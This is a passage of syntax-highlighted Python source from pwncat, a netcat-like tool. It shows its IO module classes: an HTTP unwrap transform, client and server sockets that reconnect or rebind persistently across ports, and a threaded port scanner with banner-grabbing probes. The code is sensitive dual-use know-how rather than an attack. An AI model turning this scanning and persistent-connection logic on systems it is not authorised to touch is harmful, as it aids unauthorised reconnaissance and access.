    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; bytes</span>
        <span class="hljs-string">"""Unwrap data from a HTTP packet.

        Returns:
            str: The wrapped string.
        """</span>
        request = StringEncoder.encode(<span class="hljs-string">r"^(GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH)"</span>)
        response = StringEncoder.encode(<span class="hljs-string">r"^HTTP/[.0-9]+"</span>)

        <span class="hljs-comment"># Did not receive a valid HTTP request, so we return the original untransformed message</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (re.match(request, data) <span
                            class="hljs-keyword">or</span> re.match(response, data)):
            <span class="hljs-keyword">return</span> data

        body = StringEncoder.encode(<span class="hljs-string">r"(\r\n\r\n|\n\n)(.*)"</span>)
        match = re.search(body, data)

        <span class="hljs-comment"># Check if we can separate headers and body</span>
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">or</span> len(match.group()) &lt; <span
                            class="hljs-number">2</span>:
            <span class="hljs-keyword">return</span> data
        <span class="hljs-keyword">return</span> match.group(<span class="hljs-number">2</span>)


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   6 / 11   I O   M O D U L E S</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [6/11 IO]: (1/5): IO</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IO</span>(<span
        class="hljs-params">ABC</span>):</span>  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Abstract class to for pwncat I/O modules.

    This is a skeleton that defines how the I/O module for pwncat should look like.

    The "producer" should constantly yield data received from some sort of input
    which could be user input, output from a shell command data from a socket.

    The "callback" will apply some sort of action on the data received from a producer
    which could be output to stdout, send it to the shell or to a socket.

    "The "interrupts" are a list of funtions that trigger the producer to stop
    and return to its parent thread/function. The producer must also be implemented
    in a way that it is able to act on the event which the "interrupt" func emitted.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
        <span class="hljs-string">"""`TraceLogger`: Logger instance."""</span>
        <span class="hljs-keyword">return</span> self.__log

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this IO module.

        Args:
            ssig (InterruptHandler): InterruptHandler instance used by the interrupter.
        """</span>
        super(IO, self).__init__()
        self.__ssig = ssig
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Implement a generator function which constantly yields data.

        The data could be from various sources such as: received from a socket,
        received from user input, received from shell command output or anything else.

        Yields:
            str: Data generated/produced by this function.
        """</span>

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Define a consumer callback which will apply an action on the producer output.

        Args:
            data (str): Data retrieved from the producer to work on.
        """</span>

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Define an interrupt function which will stop the producer.

        Various producer might call blocking functions and they won't be able to stop themself
        as they hang on that blocking function.
        NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.
        """</span>


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [6/11 IONetwork]: (2/5) IONetwork</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">IONetwork</span>(<span class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Pwncat implementation based on custom Socket library."""</span>

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">net</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Net</span>
        <span class="hljs-string">"""Returns instance of Net."""</span>
        <span class="hljs-keyword">return</span> self.__net

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        encoder,  <span class="hljs-comment"># type: StringEncoder</span>
        host,  <span class="hljs-comment"># type: str</span>
        ports,  <span class="hljs-comment"># type: List[int]</span>
        role,  <span class="hljs-comment"># type: str</span>
        srv_opts,  <span class="hljs-comment"># type: DsIONetworkSrv</span>
        cli_opts,  <span class="hljs-comment"># type: DsIONetworkCli</span>
        sock_opts,  <span class="hljs-comment"># type: DsIONetworkSock</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-string">"""Create a Pwncat instance of either a server or a client.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            ports ([int]): List of ports to connect to or listen on.
            role (str): Either "server" or "client".
            srv_opts (DsIONetworkSrv):   Options for the server.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        """</span>
        <span class="hljs-keyword">assert</span> role <span class="hljs-keyword">in</span> [<span
                            class="hljs-string">"server"</span>, <span
                            class="hljs-string">"client"</span>], <span class="hljs-string">"The role must be 'server' or 'client'."</span>
        super(IONetwork, self).__init__(ssig)

        self.__role = role
        self.__net = Net(encoder, ssig, sock_opts)
        self.__sock_opts = sock_opts
        self.__srv_opts = srv_opts
        self.__cli_opts = cli_opts

        <span class="hljs-comment"># Did we already run cleanup</span>
        self.__cleaned_up = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># Internally store addresses for reconn or rebind functions</span>
        self.__host = host
        self.__ports = ports
        self.__pport = <span class="hljs-number">0</span>  <span class="hljs-comment"># pointer to the current port</span>

        <span class="hljs-keyword">if</span> role == <span class="hljs-string">"server"</span>:
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__net.run_server(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__server_rebind():
                    sys.exit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">if</span> role == <span class="hljs-string">"client"</span>:
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__net.run_client(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__client_reconnect_to_server():
                    sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Network receive generator which hooks into the receive function and adds features.

        Yields:
            str: Data received from a connected socket.
        """</span>
        <span class="hljs-comment"># Counter for receive retries once this side of the program</span>
        <span class="hljs-comment"># shuts down (e.g.: Ctrl+c) as there could be data left on the wire.</span>
        curr_recv_timeout_retry = <span class="hljs-number">0</span>

        <span class="hljs-comment"># Loop endlessly and yield data back to the caller</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-comment"># [1/3] Generate data</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">yield</span> self.__net.receive()
            <span class="hljs-comment"># [2/3] Non-blocking socket is finished receiving data and allows us to do some action</span>
            <span class="hljs-keyword">except</span> socket.timeout <span
                            class="hljs-keyword">as</span> err:
                <span class="hljs-comment"># Check if we close the socket for sending</span>
                <span class="hljs-keyword">if</span> self.ssig.has_sock_send_eof():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"SOCK-SEND-EOF signal ACK in IONetwork.producer [1]: %s"</span>, err
                    )
                    self.__net.send_eof()

                <span class="hljs-comment"># Let's ask the interrupter() function if we should terminate?</span>
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.ssig.has_sock_quit():
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-comment"># Stop signal is raied when my own side of the network was closed.</span>
                <span class="hljs-comment"># Happened most likely that the user pressed Ctrl+c</span>
                <span class="hljs-comment"># Before quitting, we will check x many times, if there is still</span>
                <span class="hljs-comment"># data left to receive, before shutting down.</span>
                <span class="hljs-keyword">if</span> curr_recv_timeout_retry &lt; self.__sock_opts.recv_timeout_retry:
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"Final socket read: %d/%d before quitting."</span>,
                        curr_recv_timeout_retry + <span class="hljs-number">1</span>,
                        self.__sock_opts.recv_timeout_retry,
                    )
                    curr_recv_timeout_retry += <span class="hljs-number">1</span>
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-comment"># We ware all done reading, shut down</span>
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.producer [1]: %s"</span>, err
                )
                self.__cleanup()
                <span class="hljs-keyword">return</span>
            <span class="hljs-comment"># [3/3] Connection was closed remotely (EOF) or locally (Ctrl+C or similar)</span>
            <span class="hljs-keyword">except</span> (EOFError, AttributeError, socket.error) <span
                            class="hljs-keyword">as</span> err:
                <span class="hljs-comment"># Do we have a stop signal?</span>
                <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.producer [2]: %s"</span>, err
                    )
                    self.__cleanup()
                    <span class="hljs-keyword">return</span>
                <span class="hljs-comment"># Do we re-accept new clients?</span>
                <span class="hljs-keyword">if</span> self.__sock_opts.udp:
                    <span class="hljs-comment"># Always accept new clients or reconnect in UDP mode (its stateless)</span>
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-keyword">if</span> self.__role == <span class="hljs-string">"server"</span> <span
                            class="hljs-keyword">and</span> self.__server_reaccept_from_client():
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-keyword">if</span> self.__role == <span class="hljs-string">"client"</span> <span
                            class="hljs-keyword">and</span> self.__client_reconnect_to_server():
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-comment"># Inform everybody that we are quitting</span>
                self.log.trace(<span class="hljs-string">"SOCK-EOF signal RAISE in IONetwork.producer"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
                self.ssig.raise_sock_eof()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Send data to a socket."""</span>
        <span class="hljs-keyword">try</span>:
            self.__net.send(data)
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        self.log.trace(<span
                            class="hljs-string">"SOCK-QUIT signal RAISE in IONetwork.interrupt"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
        self.ssig.raise_sock_quit()
        self.__cleanup()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__cleanup</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Cleanup function."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__cleaned_up:
            self.log.trace(<span
                            class="hljs-string">"SOCK-QUIT-CLEANUP: Closing sockets"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
            self.__net.close_conn_sock()
            self.__net.close_bind_sock()
            self.__cleaned_up = <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__client_reconnect_to_server</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Ensure the client re-connects to the remote server, if the remote server hang up.

        Returns:
            bool: Returns `True` on success and `False` on failure or stop signal requested.
        """</span>
        <span class="hljs-keyword">assert</span> self.__role == <span
                            class="hljs-string">"client"</span>, <span class="hljs-string">"This should have been caught during arg check."</span>

        <span class="hljs-comment"># reconn &lt; 0 (endlessly)</span>
        <span class="hljs-comment"># reconn &gt; 0 (reconnect until counter reaches zero)</span>
        <span class="hljs-keyword">while</span> self.__cli_opts.reconn != <span class="hljs-number">0</span>:
            <span class="hljs-comment"># [1/6] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-comment"># We need a little wait here in order for the stop signal to propagate.</span>
            <span class="hljs-comment"># Don't know how fast the other threads are.</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [1]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [2/6] Wait</span>
            time.sleep(self.__cli_opts.reconn_wait)

            <span class="hljs-comment"># [3/6] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-comment"># In case the other threads were slower as the sleep time in [1/5]</span>
            <span class="hljs-comment"># we will check again here.</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [2]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [4/6] Increment the port numer (if --reconn-robin has multiple)</span>
            self.__pport += <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> self.__pport == len(self.__ports):
                self.__pport = <span class="hljs-number">0</span>

            <span class="hljs-keyword">if</span> self.__cli_opts.reconn &gt; <span
                            class="hljs-number">0</span>:
                self.log.info(
                    <span class="hljs-string">"Reconnecting to %s:%d in %.1f sec (%d more times left)"</span>,
                    self.__host,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                    self.__cli_opts.reconn,
                )
            <span class="hljs-keyword">else</span>:
                self.log.info(
                    <span class="hljs-string">"Reconnecting to %s:%d in %.1f sec (indefinitely)"</span>,
                    self.__host,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                )

            <span class="hljs-comment"># [5/6] Decrease reconnect counter</span>
            <span class="hljs-keyword">if</span> self.__cli_opts.reconn &gt; <span
                            class="hljs-number">0</span>:
                self.__cli_opts.reconn -= <span class="hljs-number">1</span>

            <span class="hljs-comment"># [6/6] Recurse until True or reconnect count is used up</span>
            <span class="hljs-keyword">if</span> self.__net.run_client(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [5/5] Signal failure</span>
        self.log.info(<span class="hljs-string">"Reconnect count is used up. Shutting down."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__server_rebind</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>

        <span class="hljs-comment"># rebind &lt; 0 (endlessly)</span>
        <span class="hljs-comment"># rebind &gt; 0 (rebind until counter reaches zero)</span>
        <span class="hljs-keyword">while</span> self.__srv_opts.rebind != <span class="hljs-number">0</span>:

            <span class="hljs-comment"># [1/7] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__server_rebind [1]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [2/7] Increment the port numer (if --reconn-robin has multiple)</span>
            self.__pport += <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> self.__pport == len(self.__ports):
                self.__pport = <span class="hljs-number">0</span>

            <span class="hljs-comment"># [3/7] Notify user</span>
            <span class="hljs-keyword">if</span> self.__srv_opts.rebind &gt; <span
                            class="hljs-number">0</span>:
                self.log.info(
                    <span class="hljs-string">"Rebinding to port %d in %.1f sec (%d more times left)"</span>,
                    self.__ports[self.__pport],
                    self.__srv_opts.rebind_wait,
                    self.__srv_opts.rebind,
                )
            <span class="hljs-keyword">else</span>:
                self.log.info(
                    <span class="hljs-string">"Rebinding to port %d in %.1f sec (indefinitely)"</span>,
                    self.__ports[self.__pport],
                    self.__srv_opts.rebind_wait,
                )

            <span class="hljs-comment"># [4/7] Decrease reconnect counter</span>
            <span class="hljs-keyword">if</span> self.__srv_opts.rebind &gt; <span
                            class="hljs-number">0</span>:
                self.__srv_opts.rebind -= <span class="hljs-number">1</span>

            <span class="hljs-comment"># [5/7] Wait (--rebind-wait)</span>
            time.sleep(self.__srv_opts.rebind_wait)

            <span class="hljs-comment"># [6/7] Let's ask the interrupter() function if we should terminate?</span>
            <span class="hljs-comment"># In case the other threads were slower as the sleep time in [1/7]</span>
            <span class="hljs-comment"># we will check again here.</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__server_rebind [2]"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

            <span class="hljs-comment"># [6/7] Recurse until True or reconnect count is used up</span>
            <span class="hljs-keyword">if</span> self.__net.run_server(self.__host, self.__ports[self.__pport]):
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [7/7] Nope</span>
        self.log.info(<span class="hljs-string">"Rebind count is used up. Shutting down."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__server_reaccept_from_client</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Ensure the server is able to keep connection open by re-accepting new clients.

        Returns:
            bool: True on success and False on failure
        """</span>
        <span class="hljs-comment"># Do not re-accept for UDP</span>
        <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> self.__sock_opts.udp, <span
                            class="hljs-string">"This should have been caught during arg check."</span>
        <span class="hljs-keyword">assert</span> self.__role == <span
                            class="hljs-string">"server"</span>, <span class="hljs-string">"This should have been caught during arg check."</span>

        <span class="hljs-comment"># [NO] Do not re-accept</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__srv_opts.keep_open:
            self.log.info(<span class="hljs-string">"No automatic re-accept specified. Shutting down."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [MAYBE] Check stop signal and otherwise try until success.</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            time.sleep(<span class="hljs-number">0.01</span>)
            <span class="hljs-comment"># [NO] We have a stop signal</span>
            <span class="hljs-keyword">if</span> self.ssig.has_sock_quit():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"SOCK-QUIT signal ACK in IONetwork.__server_reaccept_from_client"</span>
                )
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            <span class="hljs-comment"># [YES] Re-accept indefinitely</span>
            self.log.info(<span class="hljs-string">"Re-accepting new clients"</span>)
            <span class="hljs-keyword">if</span> self.__net.re_accept_client():
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [6/11 IONetwork]: (3/5) IONetwork</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IONetworkScanner</span>(<span
        class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Pwncat Scanner implementation based on custom Socket library."""</span>

    BANNER_PAYLOADS = {
        <span class="hljs-comment"># 0 is for generic ones, which do not have a custom port definition already</span>
        <span class="hljs-number">0</span>: [
            <span class="hljs-literal">None</span>,  <span class="hljs-comment"># This means to not send anything, but receive first</span>
            <span class="hljs-string">""</span>,
            <span class="hljs-string">"\0"</span>,
            <span class="hljs-string">"\r"</span>,
            <span class="hljs-string">"\n"</span>,
            <span class="hljs-string">"\r\n"</span>,
            <span class="hljs-string">"HEAD /\r\n\r\n"</span>,
        ],
    }

    <span class="hljs-comment"># Common regexes</span>
    BANNER_REG = [
        <span class="hljs-string">r"Server:\s*(.*)"</span>,  <span class="hljs-comment"># extract webserver from header</span>
        <span class="hljs-string">r"(.*[0-9][-.0-9]*.*)"</span>,  <span class="hljs-comment"># generic version string</span>
    ]

    <span class="hljs-comment"># Compiled versions of common regexes</span>
    BANNER_REG_COMP = []  <span class="hljs-comment"># type: List[re.Pattern[str]]</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        encoder,  <span class="hljs-comment"># type: StringEncoder</span>
        host,  <span class="hljs-comment"># type: str</span>
        banner,  <span class="hljs-comment"># type: bool</span>
        cli_opts,  <span class="hljs-comment"># type: DsIONetworkCli</span>
        sock_opts,  <span class="hljs-comment"># type: DsIONetworkSock</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-string">"""Create a Pwncat Network Scanner instance.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            banner (bool): Determines if we do banner grabbing as well.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        """</span>
        super(IONetworkScanner, self).__init__(ssig)

        self.__ssig = ssig
        self.__enc = encoder
        self.__cli_opts = cli_opts
        self.__sock_opts = sock_opts
        self.__banner = banner

        self.__log = logging.getLogger(__name__)
        self.__sock = Sock()
        self.__screen_lock = threading.Semaphore()

        <span class="hljs-comment"># Keep track of local binds (addr-port) of the threaded scanner</span>
        <span class="hljs-comment"># clients as we do not want to treat them as open ports (false posistives)</span>
        self.__local_binds = {}  <span class="hljs-comment"># type: Dict[str, socket.socket]</span>

        <span class="hljs-comment"># Compile our regexes if using banner detection</span>
        <span class="hljs-keyword">if</span> banner:
            <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> self.BANNER_REG:
                self.BANNER_REG_COMP.append(re.compile(reg, re.IGNORECASE))

        <span class="hljs-comment"># Get numerical IP addresses for IPv4 and/or IPv6</span>
        <span class="hljs-keyword">if</span> self.__sock_opts.ipv6:
            families = [int(socket.AF_INET6)]
        <span class="hljs-keyword">elif</span> self.__sock_opts.ipv4:
            families = [int(socket.AF_INET)]
        <span class="hljs-keyword">else</span>:
            families = [
                int(socket.AF_INET6),
                int(socket.AF_INET),
            ]
        self.__targets = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> families:
            <span class="hljs-keyword">try</span>:
                self.__targets[family] = self.__sock.gethostbyname(
                    host, family, <span class="hljs-keyword">not</span> self.__sock_opts.nodns
                )
            <span class="hljs-keyword">except</span> socket.gaierror:
                <span class="hljs-keyword">pass</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_socket</span>(<span
            class="hljs-params">self, family</span>):</span>
        <span class="hljs-comment"># type: (Union[socket.AddressFamily, int]) -&gt; socket.socket</span>
        <span class="hljs-string">"""Create socket for specific address family endlessly until resources are available."""</span>
        <span class="hljs-comment"># The scanner starts one thread for each port to scan. Each thread will also create</span>
        <span class="hljs-comment"># one socket and we might hit the max_allowed_files limit (ulimit).</span>
        <span class="hljs-comment"># That's why we loop through creating sockets until we hit a success</span>
        <span class="hljs-comment"># as in the meantime, other threads might have already released sockets/fd's.</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            delay = <span class="hljs-number">0.0</span>
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"TERMINATE signal ACK for IONetworkScanner._getsocket"</span>
                )
                <span class="hljs-keyword">raise</span> socket.error(<span class="hljs-string">"quit"</span>)
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">if</span> self.__sock_opts.udp:
                    <span class="hljs-keyword">return</span> self.__sock.create_socket(family, socket.SOCK_DGRAM, <span
                            class="hljs-literal">False</span>)
                <span class="hljs-keyword">return</span> self.__sock.create_socket(family, socket.SOCK_STREAM, <span
                            class="hljs-literal">False</span>)
            <span class="hljs-keyword">except</span> socket.error:
                delay += <span class="hljs-number">0.1</span>
                time.sleep(delay)  <span class="hljs-comment"># This can be bigger to give the system some time to release fd's</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_banner_version</span>(<span
            class="hljs-params">self, banner</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; Optional[str]</span>
        <span class="hljs-string">"""Extract version information from a string."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> banner <span
                            class="hljs-keyword">or</span> banner <span
                            class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

        <span class="hljs-comment"># If we only have a single line, return it (all we got)</span>
        lines = banner.splitlines()
        <span class="hljs-keyword">if</span> len(lines) == <span class="hljs-number">1</span>:
            <span class="hljs-keyword">return</span> lines[<span class="hljs-number">0</span>]

        <span class="hljs-comment"># Version extraction</span>
        <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> self.BANNER_REG_COMP:
            match = re.search(reg, banner)
            <span class="hljs-keyword">if</span> match:
                <span class="hljs-keyword">return</span> StringEncoder.rstrip(match.group(<span
                            class="hljs-number">1</span>))  <span class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># Nothing found, return first non-empty line</span>
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
            <span class="hljs-keyword">if</span> line:
                <span class="hljs-keyword">return</span> line

        <span class="hljs-comment"># Nothing found</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_banner</span>(<span
            class="hljs-params">self, sock, addr, port</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str, int) -&gt; Tuple[bool, Optional[str]]</span>
